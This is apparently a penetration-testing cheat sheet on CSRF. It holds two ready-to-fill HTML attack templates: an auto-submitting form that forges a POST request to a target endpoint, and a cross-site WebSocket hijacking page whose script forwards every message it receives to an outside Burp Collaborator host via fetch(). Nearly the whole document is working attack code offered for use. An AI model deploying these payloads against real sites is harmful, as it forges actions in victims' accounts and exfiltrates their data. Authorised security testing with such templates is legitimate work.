
# CSRF

## Web CSRF

```html
<html>
    <body onload=document.getElementById("csrf").submit()>
        <!-- The endpoint that you are trying to forge a request to -->
        <form id="csrf" action="http://<target-endpoint>" method="POST">
            <!-- From original POST request with data: "user=test&id=0" -->
            <!-- Recreate this with form inputs -->
            <input name="user" value="test">
            <input name="id" value="0">
            
    </body>
</html>
```

## Cross Site Web Socket Hijacking

```html
<html>
    <body>
        <script>
            var ws = new WebSocket('ws://<WEB-SOCKET-ENDPOINT>/');
            ws.onopen = function() {
                ws.send('<DATA-TO-BE-SENT>');
            };
            ws.onmessage = function(event) {
                fetch('http://<BURP-COLLABORATOR>/', {method: 'POST', mode: 'no-cors', body: event.data});
            };
        </script>  
    </body>
</html>
```
